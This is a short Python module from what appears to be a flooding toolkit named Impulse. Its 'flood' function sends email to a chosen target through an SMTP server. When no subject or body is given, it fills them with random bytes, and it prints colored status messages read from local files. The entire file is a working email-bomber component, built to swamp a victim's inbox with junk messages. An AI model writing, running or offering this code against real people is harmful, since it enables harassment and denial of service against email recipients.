# Import modules
from colorama import Fore
from random import _urandom, randint
# Generate random data
def __rand():
    size = randint(10, 90)
    data = str(_urandom(size))
    return data[:-1][2:]


def flood(target):
    server, username, subject, body, target = target
    # Generate random data
    if not subject:
        subject = __rand()
    if not body:
        body = __rand()
    # Message
    msg = f"From: {username}\nSubject: {subject}\n{body}"
    # Send email
    try:
        server.sendmail(username, target, msg)
    except Exception as err:
        korr=open(r'C:\Users\ender\Desktop\Impulse\tools\SMS\noMessage.txt','r')
        korr=korr.read()
        print(
            f"{Fore.MAGENTA}{korr}{Fore.MAGENTA}{err}{Fore.RESET}"
        )
    else:
        kor=open(r'C:\Users\ender\Desktop\Impulse\tools\SMS\esMessage.txt','r')
        kor=kor.read()
        print(
            f"{Fore.GREEN}[+] {Fore.YELLOW}{kor}{target}.{Fore.RESET}"
        )
